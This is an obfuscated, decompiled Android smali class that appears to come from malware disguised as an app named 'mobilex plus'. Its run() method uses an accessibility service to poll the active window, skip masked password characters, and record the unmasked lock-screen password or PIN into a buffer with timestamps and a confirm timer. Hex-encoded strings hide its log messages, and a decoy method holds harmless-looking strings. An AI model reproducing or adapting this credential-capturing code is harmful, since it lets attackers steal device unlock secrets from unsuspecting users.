.class public final Lv/s/KOlCcQzLUe3LIFgQyuVD;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic JXn4Qf7zpnLjP5:Landroid/os/Handler;

.field public vekpFI4d1Nc4fakF:Z

.field public w9sT1Swbhx3hs:I


# direct methods
.method public constructor <init>(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput-object p1, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    .line 5
    .line 6
    return-void
.end method

.method private static synthetic ibpio()V
    .locals 1

    const-string v0, "auto"

    const-string v0, "ViewHolder"

    const-string v0, "BaseFragment"

    const-string v0, "com.ui.cgwqnjcp"

    const-string v0, "Fragment"

    const-string v0, "org.manager.bhnwehuokd"

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 6

    .line 1
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPasswordPollerActive$cp()Z

    .line 2
    .line 3
    .line 4
    move-result v0

    .line 5
    if-nez v0, :cond_0

    .line 6
    .line 7
    goto/16 :goto_6

    .line 8
    .line 9
    :cond_0
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 10
    .line 11
    .line 12
    move-result-object v0

    .line 13
    const/4 v1, 0x0

    .line 14
    if-nez v0, :cond_1

    .line 15
    .line 16
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPasswordPollerActive$cp(Z)V

    .line 17
    .line 18
    .line 19
    return-void

    .line 20
    :cond_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 21
    .line 22
    .line 23
    move-result-wide v2

    .line 24
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordTime$cp()J

    .line 25
    .line 26
    .line 27
    move-result-wide v4

    .line 28
    sub-long/2addr v2, v4

    .line 29
    const-wide/16 v4, 0x7530

    .line 30
    .line 31
    cmp-long v2, v2, v4

    .line 32
    .line 33
    if-lez v2, :cond_2

    .line 34
    .line 35
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPasswordPollerActive$cp(Z)V

    .line 36
    .line 37
    .line 38
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordBuffer$cp()Ljava/lang/StringBuilder;

    .line 39
    .line 40
    .line 41
    move-result-object v0

    .line 42
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 43
    .line 44
    .line 45
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 46
    .line 47
    .line 48
    const-string v0, "001300770048009400E700B000C000A3006300660054008B00FC00BA00C000E70037007F0056008200FF00AA00C600E7006B0025000B009400B9"

    .line 49
    .line 50
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 51
    .line 52
    .line 53
    return-void

    .line 54
    :cond_2
    :try_start_0
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 55
    .line 56
    .line 57
    move-result-object v0

    .line 58
    if-eqz v0, :cond_d

    .line 59
    .line 60
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 61
    .line 62
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 63
    .line 64
    .line 65
    invoke-static {v0, v1}, Lv/s/GARjgaGEpTotOxcl8vfe;->wotphlvK9sPbXJ(Landroid/view/accessibility/AccessibilityNodeInfo;I)Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    move-result-object v3

    .line 69
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    .line 70
    .line 71
    .line 72
    move-result-object v4

    .line 73
    if-eqz v4, :cond_3

    .line 74
    .line 75
    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    move-result-object v4

    .line 79
    if-nez v4, :cond_4

    .line 80
    .line 81
    goto :goto_0

    .line 82
    :catch_0
    move-exception v0

    .line 83
    goto/16 :goto_5

    .line 84
    .line 85
    :cond_3
    :goto_0
    const-string v4, ""

    .line 86
    .line 87
    :cond_4
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 88
    .line 89
    .line 90
    if-eqz v3, :cond_9

    .line 91
    .line 92
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    .line 93
    .line 94
    .line 95
    move-result v0

    .line 96
    if-lez v0, :cond_9

    .line 97
    .line 98
    move/from16 v0, v1

    .line 99
    :goto_1
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    .line 100
    .line 101
    .line 102
    move-result v2

    nop

    nop

    .line 103
    if-ge v0, v2, :cond_8

    .line 104
    .line 105
    invoke-virtual {v3, v0}, Ljava/lang/String;->charAt(I)C

    .line 106
    .line 107
    .line 108
    move-result v2

    .line 109
    const/16 v4, 0x2022

    .line 110
    .line 111
    if-eq v2, v4, :cond_7

    .line 112
    .line 113
    const/16 v4, 0x2a

    .line 114
    .line 115
    if-eq v2, v4, :cond_7

    .line 116
    .line 117
    const/16 v4, 0x25cf

    nop

    .line 118
    .line 119
    if-ne v2, v4, :cond_5

    .line 120
    .line 121
    goto :goto_2

    .line 122
    :cond_5
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordBuffer$cp()Ljava/lang/StringBuilder;

    .line 123
    .line 124
    .line 125
    move-result-object v0

    .line 126
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 127
    .line 128
    .line 129
    move-result-object v0

    .line 130
    invoke-virtual {v3, v0}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 131
    .line 132
    .line 133
    move-result v0

    .line 134
    if-nez v0, :cond_8

    .line 135
    .line 136
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordBuffer$cp()Ljava/lang/StringBuilder;

    .line 137
    .line 138
    .line 139
    move-result-object v0

    .line 140
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 141
    .line 142
    .line 143
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordBuffer$cp()Ljava/lang/StringBuilder;

    .line 144
    .line 145
    .line 146
    move-result-object v0

    .line 147
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 148
    .line 149
    .line 150
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 151
    .line 152
    .line 153
    move-result-wide v2

    .line 154
    invoke-static {v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setLockPasswordTime$cp(J)V

    .line 155
    .line 156
    .line 157
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 158
    .line 159
    .line 160
    const-string v0, "001300770048009400E700B000C000A3006300700052008200FC00BB009200B30026006E004F00C700E500AF00D600A600370073005F00DD00B0"

    .line 161
    .line 162
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 163
    .line 164
    .line 165
    const-string v0, "006300750053008600E200AC"

    nop

    nop

    .line 166
    .line 167
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 168
    .line 169
    .line 170
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordConfirmTimer$cp()Ljava/util/Timer;

    .line 171
    .line 172
    .line 173
    move-result-object v0

    .line 174
    if-eqz v0, :cond_6

    .line 175
    .line 176
    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    .line 177
    .line 178
    .line 179
    :cond_6
    new-instance v0, Ljava/util/Timer;

    .line 180
    .line 181
    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    .line 182
    .line 183
    .line 184
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setLockPasswordConfirmTimer$cp(Ljava/util/Timer;)V

    .line 185
    .line 186
    .line 187
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordConfirmTimer$cp()Ljava/util/Timer;

    .line 188
    .line 189
    .line 190
    move-result-object v0

    .line 191
    if-eqz v0, :cond_8

    .line 192
    .line 193
    new-instance v2, Lv/s/HM4aGJXSNeHl1YeqJkL;

    .line 194
    .line 195
    const/4 v3, 0x2

    .line 196
    invoke-direct {v2, v3}, Lv/s/HM4aGJXSNeHl1YeqJkL;-><init>(I)V

    .line 197
    .line 198
    .line 199
    const-wide/16 v3, 0xbb8

    .line 200
    .line 201
    invoke-virtual {v0, v2, v3, v4}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 202
    .line 203
    .line 204
    goto :goto_3

    .line 205
    :cond_7
    :goto_2
    add-int/lit8 v0, v0, 0x1

    .line 206
    .line 207
    goto :goto_1

    .line 208
    :cond_8
    :goto_3
    iput v1, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->w9sT1Swbhx3hs:I

    .line 209
    .line 210
    iput-boolean v1, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->vekpFI4d1Nc4fakF:Z

    .line 211
    .line 212
    goto/16 :goto_4

    .line 213
    :cond_9
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 214
    .line 215
    .line 216
    move-result v0

    .line 217
    const/16 v3, 0x1

    nop

    nop

    .line 218
    if-lez v0, :cond_b

    .line 219
    .line 220
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockScreenPackages$cp()Ljava/util/Set;

    .line 221
    .line 222
    .line 223
    move-result-object v0

    .line 224
    invoke-interface {v0, v4}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 225
    .line 226
    .line 227
    move-result v0

    .line 228
    if-nez v0, :cond_b

    .line 229
    .line 230
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordBuffer$cp()Ljava/lang/StringBuilder;

    .line 231
    .line 232
    .line 233
    move-result-object v0

    .line 234
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    .line 235
    .line 236
    .line 237
    move-result v0

    .line 238
    if-lez v0, :cond_a

    .line 239
    .line 240
    invoke-virtual {v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->ibVTtJUNfrGYbW()V

    .line 241
    .line 242
    .line 243
    return-void

    .line 244
    :cond_a
    iput-boolean v3, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->vekpFI4d1Nc4fakF:Z

    .line 245
    .line 246
    :cond_b
    iget v0, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->w9sT1Swbhx3hs:I

    .line 247
    .line 248
    add-int/2addr v0, v3

    .line 249
    iput v0, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->w9sT1Swbhx3hs:I

    .line 250
    .line 251
    :goto_4
    iget-boolean v0, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->vekpFI4d1Nc4fakF:Z

    .line 252
    .line 253
    if-eqz v0, :cond_c

    .line 254
    .line 255
    iget v0, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->w9sT1Swbhx3hs:I

    .line 256
    .line 257
    const v2, 0x1e

    .line 258
    .line 259
    if-le v0, v2, :cond_c

    .line 260
    .line 261
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPasswordPollerActive$cp(Z)V

    .line 262
    .line 263
    .line 264
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordBuffer$cp()Ljava/lang/StringBuilder;

    .line 265
    .line 266
    .line 267
    move-result-object v0

    .line 268
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 269
    .line 270
    .line 271
    return-void

    .line 272
    :cond_c
    iget v0, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->w9sT1Swbhx3hs:I

    nop

    .line 273
    .line 274
    const/16 v2, 0x12c

    .line 275
    .line 276
    if-le v0, v2, :cond_d

    .line 277
    .line 278
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPasswordPollerActive$cp(Z)V

    .line 279
    .line 280
    .line 281
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockPasswordBuffer$cp()Ljava/lang/StringBuilder;

    .line 282
    .line 283
    .line 284
    move-result-object v0

    .line 285
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->setLength(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 286
    .line 287
    .line 288
    return-void

    .line 289
    :goto_5
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 290
    .line 291
    .line 292
    const-string v1, "001300770048009400E700B000C000A3006300660054008B00FC00BA00C000E7002600640049008800E200E50092"

    .line 293
    .line 294
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 295
    .line 296
    .line 297
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 298
    .line 299
    .line 300
    :cond_d
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPasswordPollerActive$cp()Z

    .line 301
    .line 302
    .line 303
    move-result v0

    .line 304
    if-eqz v0, :cond_e

    .line 305
    .line 306
    iget-object v0, p0, Lv/s/KOlCcQzLUe3LIFgQyuVD;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    .line 307
    .line 308
    const-wide/16 v1, 0x64

    .line 309
    .line 310
    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 311
    .line 312
    .line 313
    :cond_e
    :goto_6
    return-void
.end method
